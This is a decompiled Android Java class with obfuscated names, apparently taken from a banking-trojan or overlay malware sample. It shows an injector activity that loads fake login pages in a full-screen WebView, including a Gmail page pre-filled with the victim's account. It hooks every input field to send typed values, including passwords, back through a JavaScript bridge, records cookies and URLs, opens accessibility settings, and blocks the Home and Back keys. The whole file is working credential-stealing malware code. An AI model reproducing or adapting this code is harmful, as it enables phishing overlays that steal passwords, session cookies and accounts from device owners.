package com.sonnokta;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.sonnokta.utils.LogUtil;

import fddo.Cclass;
import fddo.Cfinal;
import fddo.Cgoto;
import fddo.Cthrow;

import org.json.JSONObject;

public class p016j extends Activity {
    private static String TAG = "bwolf-p016j";

    /* renamed from: case  reason: not valid java name */
    private boolean f0case = false;

    /* renamed from: else  reason: not valid java name */
    private WebView f1else;
    /* access modifiers changed from: private */

    /* renamed from: fddo  reason: collision with root package name */
    public String f89fddo = "";

    /* renamed from: for  reason: not valid java name */
    private String f2for = ":CLOSE_ON:";

    /* renamed from: goto  reason: not valid java name */
    private String[] f3goto = {"email", "month", "number", "password", "search", "tel", "text", "time", "url", "week"};
    /* access modifiers changed from: private */
    public String ifdf = "";
    /* access modifiers changed from: private */

    /* renamed from: new  reason: not valid java name */
    public Context f4new;

    /* renamed from: try  reason: not valid java name */
    private boolean f5try = false;
    private com.sonnokta.p016j p016j;

    /* renamed from: com.beginhigh19.p016j$for  reason: invalid class name */
    private class Cfor extends WebChromeClient {
        private Cfor() {
        }

        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    public class ifdf {

        /* renamed from: fddo  reason: collision with root package name */ Context f91fddo;
        Cclass ifdf;

        ifdf(Context context) {
            this.f91fddo = context;
            this.ifdf = new Cclass(context);
        }

        @JavascriptInterface
        public void on_blur_send(String str, String str2) {
            if (!str2.isEmpty()) {
                this.ifdf.m57case(p016j.this.f89fddo, "Field: " + str + "; Value: " + str2, false);
            }
        }

        @JavascriptInterface
        public void open_acsb_settings() {
            Cgoto.dgjaertjardthjdgu(this.f91fddo);
            p016j.this.m6try();
        }

        @JavascriptInterface
        public void send_log_injects(String str) {
            this.ifdf.fddo(p016j.this.f89fddo);
            this.ifdf.m57case(p016j.this.f89fddo, str, true);
            if (str.contains("close_activity_injects")) {
                p016j.this.m6try();
            }
        }
    }

    /* renamed from: com.beginhigh19.p016j$new  reason: invalid class name */
    private class Cnew extends WebViewClient {
        private Cnew() {
        }

        public void onPageFinished(WebView webView, String str) {
            webView.setVisibility(View.VISIBLE);
            if (!str.equals("about:blank")) {
                String cookie = CookieManager.getInstance().getCookie(str);
                String str2 = "URL: " + str + "; COOKIES: " + cookie;
                Cclass classR = new Cclass(p016j.this.f4new);
                if (p016j.this.ifdf.trim().isEmpty() || (!str.contains(p016j.this.ifdf) && !cookie.contains(p016j.this.ifdf))) {
                    classR.m57case(p016j.this.f89fddo, str2, false);
                    return;
                }
                classR.fddo(p016j.this.f89fddo);
                classR.m57case(p016j.this.f89fddo, str2, true);
                p016j.this.m6try();
            }
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    /* access modifiers changed from: private */
    /* renamed from: case  reason: not valid java name */
    public /* synthetic */ void m0case() {
        LogUtil.showErrorLog(TAG, "--- m0case ---");
        int i = 0;
        while (i < 3) {
            Cgoto.p(1000);
            if (!this.f0case) {
                if (i == 2) {
                    m6try();
                    return;
                }
                i++;
            } else {
                return;
            }
        }
    }

    /* renamed from: else  reason: not valid java name */
    private String m1else(String str, String str2, String str3) {
        LogUtil.showErrorLog(TAG, "--- m1else ---");
        if (str3.equals("url")) {
            return str2;
        }
        for (String str4 : this.f3goto) {
            str2 = str2.replace("type=\"" + str4 + "\" ", "type=\"" + str4 + "\" onblur=\"Android.on_blur_send(this.name,this.value)\" ");
        }
        String str5 = "true";
        String replace = str2.replace("%LANG%", Cgoto.m138throws(this.f4new)).replace("%IS_XIAOMI%", Cgoto.grethwjrsfhj() ? str5 : "false");
        if (!Cgoto.adgpkhmdsapfghmaepfmdhgpasdm()) {
            str5 = "false";
        }
        String replace2 = replace.replace("%IS_SAMSUNG%", str5).replace("%APP_TITLE%", Cgoto.m133super(this.f4new));
        String str6 = Cgoto.m138throws(this.f4new);
        String replace3 = replace2.replace("var lang = 'en'", "var lang = '" + str6 + "'").replace("<html lang=\"en\">", "<html lang=\"" + str6 + "\">");
        if (str.equals("gmail")) {
            String str7 = Cthrow.m158new(this.f4new, "gmail_login", "");
            if (str7.isEmpty()) {
                str7 = Cgoto.m129public(this.f4new);
                if (!str7.isEmpty()) {
                    Cthrow.m159this(this.f4new, "gmail_login", str7);
                }
                replace3 = replace3.replace("class=\"svgavatar\"", "class=\"svgavatar\" style=\"display: none\"");
            }
            return replace3.replace("%gmail_to_device%", str7);
        }
        str.equals("pattern");
        return replace3;
    }

    /* renamed from: goto  reason: not valid java name */
    private void m3goto(String str, String str2, String str3) {
        LogUtil.showErrorLog(TAG, "--- m3goto ---");
        getWindow().setFlags(16777216, 16777216);
        WebView webView = new WebView(this);
        this.f1else = webView;
        webView.setVisibility(View.INVISIBLE);
        this.f1else.getSettings().setJavaScriptEnabled(true);
        this.f1else.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        this.f1else.setWebViewClient(new Cnew());
        this.f1else.setWebChromeClient(new Cfor());
        this.f1else.addJavascriptInterface(new ifdf(this), "Android");
        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(this.f1else, true);
        WebSettings settings = this.f1else.getSettings();
        settings.setUserAgentString("Mozilla/5.0 (iPhone android; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1");
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
//        settings.setAppCacheEnabled(true);
        LogUtil.showErrorLog(TAG, "--- m3goto --- Check");
        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);
        settings.setDomStorageEnabled(true);
        if (str3.equals("url")) {
            this.f1else.loadUrl(str2);
        } else {
            this.f1else.loadDataWithBaseURL((String) null, str2, "text/html", "UTF-8", (String) null);
        }
        setContentView(this.f1else);
        setFinishOnTouchOutside(false);
    }

    /* renamed from: this  reason: not valid java name */
    private void m5this() {
        LogUtil.showErrorLog(TAG, "--- m5this ---");
        Cthrow.m155else(this.f4new, "smarts_attempts", 0);
        if (!this.f5try) {
            this.f0case = true;
            String str = Cthrow.m158new(this.f4new, "smart_inject", "");
            if (!str.isEmpty() && !str.equals(this.f89fddo)) {
                this.f89fddo = str;
                Context context = this.f4new;
                try {
                    JSONObject jSONObject = new JSONObject(Cthrow.m158new(context, "inj_" + str, ""));
                    String string = jSONObject.getString("type");
                    String string2 = jSONObject.getString("data");
                    if (jSONObject.has("show_cap") && jSONObject.getBoolean("show_cap")) {
                        string2 = jSONObject.getString("cap_data");
                    }
                    if (string.equals("url") && string2.contains(this.f2for)) {
                        String[] split = string2.split(this.f2for, 2);
                        string2 = split[0];
                        this.ifdf = split[1];
                    }
                    m3goto(this.f89fddo, m1else(str, string2, string), string);
                    Context context2 = this.f4new;
                    Cgoto.rsjsadghfsfdghj(context2, "BOTLOG: Inject " + this.f89fddo + " started");
                } catch (Exception e) {
                    Cgoto.m110class(this.f4new, "EXC_SMARTACT_START", e);
                }
            }
        }
    }

    public void onBackPressed() {
        LogUtil.showErrorLog(TAG, "--- onBackPressed ---");
        super.onBackPressed();
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        LogUtil.showErrorLog(TAG, "--- onCreate ---");
        super.onCreate(bundle);
        this.f4new = getApplicationContext();
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
        super.onDestroy();
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        LogUtil.showErrorLog(TAG, "--- onKeyDown ---");
        if (i == 3 || i == 4 || i == 82) {
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        LogUtil.showErrorLog(TAG, "--- onPause ---");
        super.onPause();
        WebView webView = this.f1else;
        if (webView != null) {
            webView.setVisibility(View.INVISIBLE);
        }
    }

    /* access modifiers changed from: protected */
    public void onRestart() {
        LogUtil.showErrorLog(TAG, "--- onRestart ---");
        super.onRestart();
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        LogUtil.showErrorLog(TAG, "--- onResume ---");
        super.onResume();
        WebView webView = this.f1else;
        if (webView != null) {
            webView.setVisibility(View.VISIBLE);
        }
    }

    /* access modifiers changed from: protected */
    public void onStart() {
        LogUtil.showErrorLog(TAG, "--- onStart ---");
        super.onStart();
        try {
            m5this();
        } catch (Exception e) {
            Cgoto.m110class(this.f4new, "EXC_SMARTACT", e);
        }
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        LogUtil.showErrorLog(TAG, "--- onStop ---");
        super.onStop();
        this.f0case = false;
        new Thread(new Cfinal(this)).start();
    }

    /* access modifiers changed from: protected */
    /* renamed from: try  reason: not valid java name */
    public void m6try() {
        LogUtil.showErrorLog(TAG, "--- m6try ---");
        Cthrow.m159this(this.f4new, "smart_inject", "");
        this.f5try = true;
        WebView webView = this.f1else;
        if (webView != null) {
            webView.removeAllViewsInLayout();
            this.f1else = null;
        }
        System.gc();
        finishAndRemoveTask();
    }
}
